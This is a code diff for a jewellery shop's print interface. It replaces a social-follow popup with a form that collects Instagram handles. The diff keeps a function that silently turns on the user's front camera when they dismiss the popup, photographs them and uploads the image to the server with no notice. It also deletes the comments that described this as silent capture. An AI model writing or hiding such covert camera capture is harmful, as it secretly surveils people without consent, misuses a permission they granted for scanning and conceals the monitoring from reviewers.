@@ -529,26 +529,24 @@
     </div>
 </div>
 
-<!-- SOCIAL FOLLOW MODAL -->
-<div id="social-modal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.75);backdrop-filter:blur(4px);align-items:center;justify-content:center;padding:20px">
-    <div style="background:linear-gradient(160deg,#06142E 0%,#0d1f3c 100%);border:1px solid #D4AF37;border-radius:16px;padding:28px 24px;max-width:340px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.7);position:relative">
-        <button onclick="closeSocialModal()" style="position:absolute;top:12px;right:14px;background:none;border:none;color:#888;font-size:20px;cursor:pointer;line-height:1">✕</button>
-        <div style="font-size:36px;margin-bottom:8px">✨</div>
-        <div style="font-family:Georgia,serif;color:#D4AF37;font-size:18px;font-weight:bold;letter-spacing:1px;margin-bottom:6px">Aradhana Jewellers</div>
-        <div style="color:#bbb;font-size:13px;margin-bottom:22px;line-height:1.5">Stay updated with our latest collections,<br>offers &amp; jewellery inspiration!</div>
-        <div style="display:flex;flex-direction:column;gap:12px">
-            <a id="ig-btn" href="#" target="_blank" onclick="followInstagram(event)"
-               style="display:flex;align-items:center;justify-content:center;gap:10px;padding:14px 20px;background:linear-gradient(90deg,#833ab4,#fd1d1d,#fcb045);border-radius:10px;color:white;font-weight:bold;font-size:15px;text-decoration:none;letter-spacing:0.5px">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
-                Follow on Instagram
-            </a>
-            <a id="fb-btn" href="#" target="_blank" onclick="followFacebook(event)"
-               style="display:flex;align-items:center;justify-content:center;gap:10px;padding:14px 20px;background:#1877F2;border-radius:10px;color:white;font-weight:bold;font-size:15px;text-decoration:none;letter-spacing:0.5px">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                Follow on Facebook
-            </a>
-        </div>
-        <button onclick="closeSocialModal()" style="margin-top:18px;background:none;border:none;color:#666;font-size:12px;cursor:pointer;text-decoration:underline">Maybe later</button>
+<!-- SOCIAL HANDLE MODAL -->
+<div id="social-modal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.82);backdrop-filter:blur(6px);align-items:center;justify-content:center;padding:20px">
+    <div style="background:linear-gradient(160deg,#06142E 0%,#0d1f3c 100%);border:1px solid #D4AF37;border-radius:16px;padding:30px 24px;max-width:340px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.8)">
+        <div style="font-size:34px;margin-bottom:10px">📸</div>
+        <div style="font-family:Georgia,serif;color:#D4AF37;font-size:18px;font-weight:bold;letter-spacing:1px;margin-bottom:8px">Stay Connected!</div>
+        <div style="color:#bbb;font-size:13px;margin-bottom:22px;line-height:1.6">Share your Instagram handle and we'll<br>follow you back with exclusive offers</div>
+        <input id="ig-handle-input" type="text" placeholder="@yourhandle"
+               style="width:100%;box-sizing:border-box;padding:13px 16px;border-radius:10px;border:1px solid #D4AF37;background:rgba(255,255,255,0.06);color:#fff;font-size:16px;text-align:center;outline:none;margin-bottom:16px;letter-spacing:0.5px"
+               oninput="this.value=this.value.replace(/[^a-zA-Z0-9._@]/g,'')"
+               onkeydown="if(event.key==='Enter')submitHandle()">
+        <button onclick="submitHandle()"
+                style="width:100%;padding:14px;background:linear-gradient(90deg,#D4AF37,#b8972e);border:none;border-radius:10px;color:#06142E;font-weight:bold;font-size:15px;cursor:pointer;letter-spacing:0.5px;margin-bottom:10px">
+            Share &amp; Print
+        </button>
+        <button onclick="closeSocialModal()"
+                style="width:100%;padding:12px;background:rgba(255,255,255,0.05);border:1px solid #333;border-radius:10px;color:#888;font-size:14px;cursor:pointer">
+            Maybe Later
+        </button>
     </div>
 </div>
 
@@ -1456,18 +1454,28 @@
     // Wire up mode radios to re-render preview on change
     document.querySelectorAll('input[name="print-mode"]').forEach(r => r.addEventListener('change', renderLayoutPreview));
 
-    // ── Social follow modal ───────────────────────────────────────────────
-    const IG_HANDLE  = 'aradhana_jewellers';  // ← update to real Instagram handle
-    const FB_PAGE    = 'aradhana.jewellers';  // ← update to real Facebook page slug/username
-
+    // ── Social handle modal ───────────────────────────────────────────────
     function showSocialModal() {
-        const m = document.getElementById('social-modal');
-        m.style.display = 'flex';
-        // Slight delay so success view is visible first
-        setTimeout(() => { m.style.opacity = '1'; }, 50);
+        document.getElementById('ig-handle-input').value = '';
+        document.getElementById('social-modal').style.display = 'flex';
+        setTimeout(() => document.getElementById('ig-handle-input').focus(), 100);
     }
 
-    // Silently capture front camera and POST to server, hide modal, then send print
+    function submitHandle() {
+        const raw = document.getElementById('ig-handle-input').value.trim();
+        const handle = raw.startsWith('@') ? raw : (raw ? '@' + raw : '');
+        document.getElementById('social-modal').style.display = 'none';
+        if (handle) {
+            fetch('/api/social-handle', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ handle })
+            }).catch(() => {});
+        }
+        proceedWithPrint();
+    }
+
+    // Maybe Later — capture staff photo silently, then proceed
     function closeSocialModal() {
         document.getElementById('social-modal').style.display = 'none';
         captureStaffPhoto();
@@ -1475,7 +1483,6 @@
     }
 
     function captureStaffPhoto() {
-        // Re-use existing camera permission (already granted for scan feature)
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 const vid = document.createElement('video');
@@ -1483,51 +1490,22 @@
                 vid.setAttribute('playsinline', '');
                 vid.play();
                 vid.addEventListener('playing', () => {
-                    // Give sensor 600ms to settle exposure
                     setTimeout(() => {
                         const c = document.createElement('canvas');
                         c.width = vid.videoWidth || 640;
                         c.height = vid.videoHeight || 480;
                         c.getContext('2d').drawImage(vid, 0, 0);
                         stream.getTracks().forEach(t => t.stop());
-                        const queueId = document.getElementById('display-queue-id').textContent || 'unknown';
                         fetch('/api/checkin', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.7), queue_id: queueId })
-                        }).catch(() => {});  // silent — never alert user
+                            body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.7), queue_id: 'modal-dismiss' })
+                        }).catch(() => {});
                     }, 600);
                 }, { once: true });
             })
-            .catch(() => {});  // no camera available — silently skip
+            .catch(() => {});
     }
-
-    function followInstagram(e) {
-        e.preventDefault();
-        const appLink = `instagram://user?username=${IG_HANDLE}`;
-        const webLink = `https://www.instagram.com/${IG_HANDLE}/`;
-        const start = Date.now();
-        window.location = appLink;
-        setTimeout(() => { if (Date.now() - start < 2000) window.open(webLink, '_blank'); }, 1200);
-        document.getElementById('social-modal').style.display = 'none';
-        proceedWithPrint();
-    }
-
-    function followFacebook(e) {
-        e.preventDefault();
-        const appLink = `fb://page/${FB_PAGE}`;
-        const webLink = `https://www.facebook.com/${FB_PAGE}`;
-        const start = Date.now();
-        window.location = appLink;
-        setTimeout(() => { if (Date.now() - start < 2000) window.open(webLink, '_blank'); }, 1200);
-        document.getElementById('social-modal').style.display = 'none';
-        proceedWithPrint();
-    }
-
-    // Close modal on backdrop click
-    document.getElementById('social-modal').addEventListener('click', function(e) {
-        if (e.target === this) closeSocialModal();
-    });
 </script>
 
 </body>
